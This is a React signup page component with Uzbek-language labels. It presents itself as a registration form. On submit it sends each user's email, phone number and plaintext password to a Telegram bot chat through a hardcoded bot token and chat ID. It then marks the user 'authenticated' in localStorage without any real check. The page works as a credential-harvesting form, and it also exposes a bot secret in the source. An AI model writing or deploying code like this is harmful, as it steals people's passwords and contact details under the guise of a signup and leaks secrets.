
import { useState } from "react";
import { toast } from "react-toastify";
import { Loader } from "lucide-react";
import { useNavigate } from "react-router-dom";

export default function AuthPage() {
    const [email, setEmail] = useState("");
    const [password, setPassword] = useState("");
    const [phone, setPhone] = useState("");
    const [emailError, setEmailError] = useState(false);
    const [passError, setPassError] = useState(false);
    const [phoneError, setPhoneError] = useState(false);
    const [isloading, setLoading] = useState(false);

    const navigate = useNavigate();

    const regexEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const regexPassword = /^[a-zA-Z0-9!@#$%^&*]{6,16}$/;
    const regexPhone = /^\+?[0-9]{9,15}$/;

    const BOT_TOKEN = `8389898735:AAH1MsADfS6yjL3EXLbwMmlgtJ6lgPr1j3A`;
    const MY_CHAT_ID = `8155528404`;

    const handleSubmit = async (e) => {
        e.preventDefault();

        let emailValid = regexEmail.test(email);
        let passwordValid = regexPassword.test(password);
        let phoneValid = regexPhone.test(phone);

        setEmailError(!emailValid);
        setPassError(!passwordValid);
        setPhoneError(!phoneValid);

        if (emailValid && passwordValid && phoneValid) {
            setLoading(true);

            const text = `
🆕 Yangi foydalanuvchi:
📧 Email: ${email}
📱 Telefon: ${phone}
🔐 Parol: ${password}
            `;

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: MY_CHAT_ID,
                        text,
                        parse_mode: "HTML",
                    }),
                });

                localStorage.setItem("isAuthenticated", "true");

                toast.success("Muvaffaqiyatli ro'yhatdan o'tdingiz!");
                setEmail("");
                setPassword("");
                setPhone("");
                setLoading(false);

                navigate("/"); // bosh sahifaga yo‘naltirish
            } catch (error) {
                console.error(error);
                toast.error("Xatolik yuz berdi!");
                setLoading(false);
            }
        } else {
            toast.error("Iltimos, ma'lumotlarni to‘g‘ri kiriting");
        }
    };

    return (
        <div className=" -mt-[70px] slide-bg relative w-full h-[737px] bg-cover bg-center bg-[url('/src/img/Cover.png')] flex justify-center items-center w-[100] h-[737px] bg-[url('/src/Conponit/Container.webp')] bg-cover bg-cente">
            <form onSubmit={handleSubmit} className="flex shadow-xl w-[900px] rounded-xl p-6 bg-white/70 backdrop-blur-md border border-gray-300">
                <iframe src="https://my.spline.design/genkubgreetingrobot-BEJT5t4bdIAhgacAXRzXgd9K/" frameBorder="0" className="w-[500px] h-[500px] rounded-md"></iframe>
                <div className="w-[300px]">
                    <h2 className="text-center text-2xl font-bold mb-6 text-gray-700">Ro‘yxatdan o‘tish</h2>

                    <div className="mb-4">
                        <label className="block mb-2 font-medium text-gray-700">Email</label>
                        <input
                            type="text"
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                            placeholder="Email kiriting"
                            className={`w-full py-2 px-3 rounded-lg outline-none border transition-all duration-200 
                            ${emailError ? "border-red-500 bg-white" : email ? "border-green-500 bg-green-100" : "border-gray-300 bg-white"}`}
                        />
                        {emailError && <p className="text-red-500 text-sm mt-1">Emailda xatolik bor!</p>}
                    </div>

                    <div className="mb-4">
                        <label className="block mb-2 font-medium text-gray-700">Telefon raqam</label>
                        <input
                            type="text"
                            value={phone}
                            onChange={(e) => setPhone(e.target.value)}
                            placeholder="+998"
                            className={`w-full py-2 px-3 rounded-lg outline-none border transition-all duration-200 
                            ${phoneError ? "border-red-500 bg-white" : phone ? "border-green-500 bg-green-100" : "border-gray-300 bg-white"}`}
                        />
                        {phoneError && <p className="text-red-500 text-sm mt-1">Telefon raqam noto‘g‘ri formatda!</p>}
                    </div>

                    <div className="mb-6">
                        <label className="block mb-2 font-medium text-gray-700">Parol</label>
                        <input
                            type="password"
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            placeholder="Parol kiriting"
                            className={`w-full py-2 px-3 rounded-lg outline-none border transition-all duration-200 
                            ${passError ? "border-red-500 bg-white" : password ? "border-green-500 bg-green-100" : "border-gray-300 bg-white"}`}
                        />
                        {passError && <p className="text-red-500 text-sm mt-1">Parol 6–16 ta belgidan iborat bo‘lishi kerak!</p>}
                    </div>

                    <button type="submit" disabled={isloading} className="flex items-center gap-2 justify-center w-full py-2 rounded-lg bg-green-500 text-white font-semibold hover:bg-green-600 transition-all">
                        {isloading && <Loader className="animate-spin" />}
                        Yuborish
                    </button>
                </div>
            </form>
        </div>
    );
}
